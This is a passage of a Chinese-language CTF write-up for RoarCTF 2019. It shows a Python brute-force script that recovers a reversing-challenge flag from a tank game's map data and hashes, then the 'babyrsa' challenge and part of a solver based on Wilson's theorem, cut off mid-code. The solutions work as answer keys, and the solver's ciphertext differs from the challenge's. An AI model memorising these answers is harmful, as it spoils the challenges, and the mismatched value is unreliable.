src="/2019/10/20/roarctf-bu-fen-wp/5.PNG"><p>发现游戏的要求是nDestroyNum这个变量是4或者5的时候，会执行函数，将执行的结果赋值给变量a。判断a的置是否与hash值是否相等，相等就调用MD5，加密得到flag</p><img src="/2019/10/20/roarctf-bu-fen-wp/6.PNG"><p>在init函数找到了在for循环的数组，并且发现数字的对应关系为，8为空地，1为砖，4为水池，5为草地，2为不可摧毁的墙，0为基地</p><p>上图可以得知，如果攻击的是墙，那么数据将由1变为8，nDestroyNum加1，如果攻击的是基地，游戏结束，nDestroyNum加1数据由0变为9</p><img src="/2019/10/20/roarctf-bu-fen-wp/8.PNG"><p>再看MD5函数，它会取出传输过来的数据的前十位，所以可以写出脚本对flag进行爆破</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> Crypto<span class="token keyword">import</span> hashlibmaps<span class="token operator">=</span><span class="token string">"clearlove9"</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes<span class="token punctuation">,</span>bytes_to_longdata<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                      <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                      <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                      <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                      <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                      <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                      <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                      <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                      <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                      <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                      <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#print(data[2][1])</span>blick<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> i<span class="token punctuation">:</span>            maps<span class="token operator">=</span>maps<span class="token operator">+</span>str<span class="token punctuation">(</span>j<span class="token punctuation">)</span>maps<span class="token operator">=</span>maps<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">,</span><span class="token string">"9"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print(maps)</span>len1<span class="token operator">=</span>len<span class="token punctuation">(</span>maps<span class="token punctuation">)</span><span class="token keyword">for</span> k <span class="token keyword">in</span> range<span class="token punctuation">(</span>len1<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> maps<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">:</span>        blick<span class="token punctuation">.</span>append<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print(blick)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>blick<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>blick<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> range<span class="token punctuation">(</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>blick<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    a <span class="token operator">=</span> blick<span class="token punctuation">[</span>i<span class="token punctuation">]</span>                    b <span class="token operator">=</span> blick<span class="token punctuation">[</span>j<span class="token punctuation">]</span>                    c <span class="token operator">=</span> blick<span class="token punctuation">[</span>k<span class="token punctuation">]</span>                    tmpstr<span class="token operator">=</span>maps<span class="token punctuation">[</span><span class="token punctuation">:</span>a<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'8'</span><span class="token operator">+</span>maps<span class="token punctuation">[</span>a<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span>b<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'8'</span><span class="token operator">+</span>maps<span class="token punctuation">[</span>b<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span>c<span class="token punctuation">]</span> <span class="token operator">+</span><span class="token string">'8'</span><span class="token operator">+</span>maps<span class="token punctuation">[</span>c<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>                    sha<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>                    sha<span class="token punctuation">.</span>update<span class="token punctuation">(</span>tmpstr<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    result<span class="token operator">=</span>sha<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token keyword">if</span> result<span class="token operator">==</span><span class="token string">"3f649f708aafa7a0a94138dc3022f6ea611e8d01"</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>tmpstr<span class="token punctuation">)</span>flag1<span class="token operator">=</span><span class="token string">'636C6561726C6F766539383838383838383838383838383838383838383435383131313131313838383834383832383838383531383838313831383438383538323838383831383834383131353838383838323438313138383138353135383838383835383831353838383831383838383838313838383838383838313831353838313838313838313134383838383831383834313838353138383838383432383838313138353832383531343838383135313839313438383838383838383838383838383131383138383231383835323138383838383838383438383231313832313831383838313138383434383834323438343838383834383831323838383831383831383138383131353838383838383838313838383838383131353238383838383838383238383838343831383238313538383438383838383832383138383138383138323235383838323138383838323834353831313235383838383838383838383838383838383838'</span>flag2<span class="token operator">=</span>long_to_bytes<span class="token punctuation">(</span>int<span class="token punctuation">(</span>flag1<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#flag1=bytes(tmpstr,'utf-8')</span>flag3<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>flag2<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#flag="805CEC3545928EA0D6DE4E0E6C53B6B0"</span>flag<span class="token operator">=</span><span class="token string">"RoarCTF{wm-"</span><span class="token operator">+</span>flag3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"}"</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><p>flag1为tmpstr的hex码</p><p>运行得到flag</p><img src="/2019/10/20/roarctf-bu-fen-wp/9.PNG"><h4 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h4><h5 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h5><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> sympy<span class="token keyword">import</span> random<span class="token keyword">def</span> <span class="token function">myGetPrime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    A<span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">513</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span>    B<span class="token operator">=</span>A<span class="token operator">-</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1e3</span><span class="token punctuation">,</span><span class="token number">1e5</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>B<span class="token punctuation">)</span>    <span class="token keyword">return</span> sympy<span class="token punctuation">.</span>nextPrime<span class="token punctuation">(</span><span class="token punctuation">(</span>B!<span class="token punctuation">)</span><span class="token operator">%</span>A<span class="token punctuation">)</span>p<span class="token operator">=</span>myGetPrime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407</span><span class="token comment" spellcheck="true">#B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596</span>q<span class="token operator">=</span>myGetPrime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927</span><span class="token comment" spellcheck="true">#B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026</span>r<span class="token operator">=</span>myGetPrime<span class="token punctuation">(</span><span class="token punctuation">)</span>n<span class="token operator">=</span>p<span class="token operator">*</span>q<span class="token operator">*</span>r<span class="token comment" spellcheck="true">#n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>flag<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#e=0x1001</span><span class="token comment" spellcheck="true">#c=75531026993868251352832208911646819562203650180318991084051400914767117788673361444822170303459754666840762396074155099975688487108827427310186815074158652155442332443785051122467525757916332663258719550896949491018311677089433922814557556027810211990588097555817841395366358450704782414037403190774111526401180911188413132407449353276693232844526881681334994004076847851157292586827912201968165931761807685129017400903834475891992746559580625966960395956170928</span><span class="token comment" spellcheck="true">#so,what is the flag?</span></code></pre><p>题目主要考威尔逊定理，利用威尔逊定理求大数的阶乘。</p><p><strong>在初等数论中，威尔逊定理给出了判定一个自然数是否为素数的充分必要条件。即：当且仅当p为素数时：( p -1 )! ≡ -1 ( mod p )</strong></p><p>简洁来说，当p为质数时，有</p><pre><code>( p -1 )! ≡ -1 ( mod p )</code></pre><p>在本题目中，A1,A2,都是素数，B=A-random.randint(1e3,1e5)，B与A差别是随即数，且B小于A,要求B的阶乘，我们可以运用威尔逊定理。脚本如下：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> sympy<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true"># def myGetPrime():</span><span class="token comment" spellcheck="true">#     A= getPrime(513)</span><span class="token comment" spellcheck="true">#     print(A)</span><span class="token comment" spellcheck="true">#     B=A-random.randint(1e3,1e5)</span><span class="token comment" spellcheck="true">#     print(B)</span><span class="token comment" spellcheck="true">#     return sympy.nextPrime((B!)%A)</span><span class="token keyword">def</span> <span class="token function">getmod</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>    mod <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>y<span class="token operator">&lt;=</span>x<span class="token number">-2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        mod<span class="token operator">*=</span>y        mod<span class="token operator">%=</span>x        y<span class="token operator">+=</span><span class="token number">1</span>    <span class="token keyword">return</span> mod A1<span class="token operator">=</span><span class="token number">21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407</span>B1<span class="token operator">=</span><span class="token number">21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596</span>A2<span class="token operator">=</span><span class="token number">16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927</span>B2<span class="token operator">=</span><span class="token number">16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026</span>n<span class="token operator">=</span><span class="token number">85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733</span>e<span class="token operator">=</span><span class="token number">0x1001</span>c<span class="token operator">=</span><span class="token number">38347207883249601033653636821391847544875416880619614342339765883967916960100888999916613942668007089161071995631543462301367053958077198225214363505024848543179161424532987598516195302155764378892435582732218546342964613797538210260769612972831286966696915391991999466554505813797987381860855552244138180628982832282918799144636417921948189345110125610972711494191577055380771099863428248761761388282714659239444209955862537018724141881150316760288205511447144</span>x1<span class="token operator">=</span>getmod<span class="token 